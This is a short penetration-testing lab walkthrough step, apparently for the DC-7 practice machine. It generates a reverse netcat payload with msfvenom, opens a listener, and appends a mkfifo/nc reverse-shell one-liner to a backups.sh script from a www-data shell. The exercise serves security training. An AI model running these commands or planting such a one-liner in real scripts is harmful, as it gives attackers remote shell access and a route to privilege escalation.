5.1 Generate code with msfvenom


a) On your Kali Machine use “msfvenom” to generate a malicious piece of code for obtaining a “bash shell”.

$msfvenom -p cmd/unix/reverse_netcat lhost=192.168.12.56 lport=8888 R

b) Open on your Kali Machine a “netcat” session.

$nc -lvp 8888



c) Copy the following code on the “www-data” shell and run it.

www-data@dc-7:/$cd /opt/scripts
www-data@dc-7:/$echo "mkfifo /tmp/ieyz; nc 192.168.12.56 8888 0</tmp/ieyz | /bin/sh >/tmp/ieyz 2>&1; rm /tmp/ieyz" >> backups.sh
www-data@dc-7:/$./backups.sh
